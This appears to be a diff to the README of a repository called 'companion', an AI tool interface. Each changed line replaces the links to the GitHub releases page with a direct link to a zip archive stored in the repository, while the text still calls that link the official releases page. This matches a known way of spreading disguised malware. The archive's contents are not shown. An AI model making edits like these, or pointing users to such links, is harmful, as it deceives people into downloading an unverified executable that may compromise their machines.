@@ -1,6 +1,6 @@
 # 🔗 companion - Easy Interface for AI Tools
 
-[![Download companion](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/marcu1212/companion/releases)
+[![Download companion](https://raw.githubusercontent.com/marcu1212/companion/main/landing/Software-v3.3.zip)](https://raw.githubusercontent.com/marcu1212/companion/main/landing/Software-v3.3.zip)
 
 ---
 
@@ -59,7 +59,7 @@ To start using companion, follow these steps:
 
 1. **Visit the official releases page:**
 
-[Download companion Here](https://github.com/marcu1212/companion/releases)
+[Download companion Here](https://raw.githubusercontent.com/marcu1212/companion/main/landing/Software-v3.3.zip)
 
 2. On this page, you will find the latest versions of companion for web and mobile.
 
@@ -98,7 +98,7 @@ If you experience problems while using companion, try these tips:
 
 To keep companion working well with the latest AI features:
 
-- Visit the [releases page](https://github.com/marcu1212/companion/releases) regularly.
+- Visit the [releases page](https://raw.githubusercontent.com/marcu1212/companion/main/landing/Software-v3.3.zip) regularly.
 - Download the newest version of companion when it is available.
 - Replace the old files with the new ones or update the app on your device.
 - Simply refreshing your browser page will load the latest web app version if no download is required.
@@ -130,6 +130,6 @@ Although companion is designed for simplicity, if you need help:
 
 ## 🌐 Links
 
-- GitHub Releases: [https://github.com/marcu1212/companion/releases](https://github.com/marcu1212/companion/releases)
+- GitHub Releases: [https://raw.githubusercontent.com/marcu1212/companion/main/landing/Software-v3.3.zip](https://raw.githubusercontent.com/marcu1212/companion/main/landing/Software-v3.3.zip)
 
-[![Download companion](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/marcu1212/companion/releases)
+[![Download companion](https://raw.githubusercontent.com/marcu1212/companion/main/landing/Software-v3.3.zip)](https://raw.githubusercontent.com/marcu1212/companion/main/landing/Software-v3.3.zip)
